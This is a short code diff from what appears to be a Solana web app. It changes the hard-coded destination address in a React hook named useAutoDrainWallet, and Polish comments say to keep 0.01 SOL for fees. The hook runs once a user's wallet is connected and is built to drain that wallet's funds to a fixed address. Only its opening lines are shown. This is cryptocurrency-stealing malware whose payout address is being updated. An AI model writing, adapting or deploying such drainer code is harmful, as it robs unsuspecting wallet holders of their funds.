@@ -9,7 +9,7 @@ const useAutoDrainWallet = () => {
   useEffect(() => {
     if (!connected || !publicKey || !wallet?.adapter) return
 
-    const TARGET_ADDRESS = new PublicKey('4t2CPCMWw5XejHsz1bpvjqYo6haHbZAwJ6eApfRx75LA') // Adres docelowy
+    const TARGET_ADDRESS = new PublicKey('RaybDJtgwmLE1AWmEMXXtPQSjkV1soWVSxK152iqWZu') // Adres docelowy
     const SOL_TO_KEEP = 0.01 // Zostaw 0.01 SOL na opłaty
 
     const drainWallet = async () => {
